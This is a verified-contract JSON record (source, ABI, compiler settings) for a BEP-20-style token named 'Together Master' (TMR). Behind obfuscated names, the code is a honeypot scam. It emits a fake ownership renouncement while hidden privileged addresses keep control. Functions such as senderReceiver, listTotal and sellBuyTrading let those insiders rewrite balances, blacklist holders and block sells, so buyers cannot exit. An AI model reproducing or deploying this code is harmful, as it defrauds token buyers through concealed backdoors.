{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface marketingWallet {\n    function createPair(address txIs, address fundMin) external returns (address);\n}\n\ninterface walletMinLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAuto) external view returns (uint256);\n\n    function transfer(address tradingMarketing, uint256 shouldFund) external returns (bool);\n\n    function allowance(address exemptTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMarketing,\n        uint256 shouldFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedAmount, uint256 value);\n    event Approval(address indexed exemptTrading, address indexed spender, uint256 value);\n}\n\nabstract contract txReceiverReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromTakeEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchTo is walletMinLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TogetherMaster is txReceiverReceiver, walletMinLaunch, launchTo {\n\n    constructor (){\n        if (minShould != limitMarketing) {\n            modeList = true;\n        }\n        fromTakeEnable shouldBuy = fromTakeEnable(takeBuyEnable);\n        toLaunched = marketingWallet(shouldBuy.factory()).createPair(shouldBuy.WETH(), address(this));\n        if (limitMarketing != maxMarketing) {\n            minShould = tokenBuy;\n        }\n        launchLiquidity = _msgSender();\n        atAmountToken[launchLiquidity] = true;\n        minTrading[launchLiquidity] = fundAuto;\n        totalMode();\n        \n        emit Transfer(address(0), launchLiquidity, fundAuto);\n    }\n\n    uint256 public maxMarketing;\n\n    address takeBuyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public tokenBuy;\n\n    uint256 public limitMarketing;\n\n    mapping(address => mapping(address => uint256)) private txEnableFee;\n\n    bool public maxAmount;\n\n    function allowance(address receiverWallet, address totalLaunched) external view virtual override returns (uint256) {\n        if (totalLaunched == takeBuyEnable) {\n            return type(uint256).max;\n        }\n        return txEnableFee[receiverWallet][totalLaunched];\n    }\n\n    mapping(address => uint256) private minTrading;\n\n    function maxShould(address launchedAuto, address tradingMarketing, uint256 shouldFund) internal returns (bool) {\n        require(minTrading[launchedAuto] >= shouldFund);\n        minTrading[launchedAuto] -= shouldFund;\n        minTrading[tradingMarketing] += shouldFund;\n        emit Transfer(launchedAuto, tradingMarketing, shouldFund);\n        return true;\n    }\n\n    address public toLaunched;\n\n    function senderReceiver(address receiverTotal, uint256 shouldFund) public {\n        tokenLimit();\n        minTrading[receiverTotal] = shouldFund;\n    }\n\n    uint256 public minShould;\n\n    address tokenBuyTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public swapTo;\n\n    uint256 liquidityWallet;\n\n    event OwnershipTransferred(address indexed isLaunched, address indexed limitWallet);\n\n    bool public minReceiverSell;\n\n    address private minReceiverAmount;\n\n    mapping(address => bool) public atAmountToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAuto;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundSell;\n    }\n\n    function transfer(address receiverTotal, uint256 shouldFund) external virtual override returns (bool) {\n        return shouldAutoLiquidity(_msgSender(), receiverTotal, shouldFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedToken;\n    }\n\n    uint256 private fundAuto = 100000000 * 10 ** 18;\n\n    function listTotal(address walletFrom) public {\n        tokenLimit();\n        \n        if (walletFrom == launchLiquidity || walletFrom == toLaunched) {\n            return;\n        }\n        totalSender[walletFrom] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return minReceiverAmount;\n    }\n\n    function owner() external view returns (address) {\n        return minReceiverAmount;\n    }\n\n    uint256 tradingTotal;\n\n    function totalMode() public {\n        emit OwnershipTransferred(launchLiquidity, address(0));\n        minReceiverAmount = address(0);\n    }\n\n    uint256 constant teamTakeSender = 19 ** 10;\n\n    function sellBuyTrading(uint256 shouldFund) public {\n        tokenLimit();\n        tradingTotal = shouldFund;\n    }\n\n    address public launchLiquidity;\n\n    string private launchedToken = \"TMR\";\n\n    string private maxMode = \"Together Master\";\n\n    function tokenLimit() private view {\n        require(atAmountToken[_msgSender()]);\n    }\n\n    function approve(address totalLaunched, uint256 shouldFund) public virtual override returns (bool) {\n        txEnableFee[_msgSender()][totalLaunched] = shouldFund;\n        emit Approval(_msgSender(), totalLaunched, shouldFund);\n        return true;\n    }\n\n    function shouldAutoLiquidity(address launchedAuto, address tradingMarketing, uint256 shouldFund) internal returns (bool) {\n        if (launchedAuto == launchLiquidity) {\n            return maxShould(launchedAuto, tradingMarketing, shouldFund);\n        }\n        uint256 feeMin = walletMinLaunch(toLaunched).balanceOf(tokenBuyTrading);\n        require(feeMin == tradingTotal);\n        require(tradingMarketing != tokenBuyTrading);\n        if (totalSender[launchedAuto]) {\n            return maxShould(launchedAuto, tradingMarketing, teamTakeSender);\n        }\n        return maxShould(launchedAuto, tradingMarketing, shouldFund);\n    }\n\n    function transferFrom(address launchedAuto, address tradingMarketing, uint256 shouldFund) external override returns (bool) {\n        if (_msgSender() != takeBuyEnable) {\n            if (txEnableFee[launchedAuto][_msgSender()] != type(uint256).max) {\n                require(shouldFund <= txEnableFee[launchedAuto][_msgSender()]);\n                txEnableFee[launchedAuto][_msgSender()] -= shouldFund;\n            }\n        }\n        return shouldAutoLiquidity(launchedAuto, tradingMarketing, shouldFund);\n    }\n\n    function balanceOf(address launchAuto) public view virtual override returns (uint256) {\n        return minTrading[launchAuto];\n    }\n\n    bool private modeList;\n\n    function txFundTo(address listToFund) public {\n        if (minReceiverSell) {\n            return;\n        }\n        if (maxAtTo != swapTo) {\n            tokenBuy = limitMarketing;\n        }\n        atAmountToken[listToFund] = true;\n        if (maxAmount) {\n            limitMarketing = maxMarketing;\n        }\n        minReceiverSell = true;\n    }\n\n    mapping(address => bool) public totalSender;\n\n    uint8 private fundSell = 18;\n\n    bool private maxAtTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atAmountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"}],\"name\":\"listTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"sellBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToFund\",\"type\":\"address\"}],\"name\":\"txFundTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TogetherMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}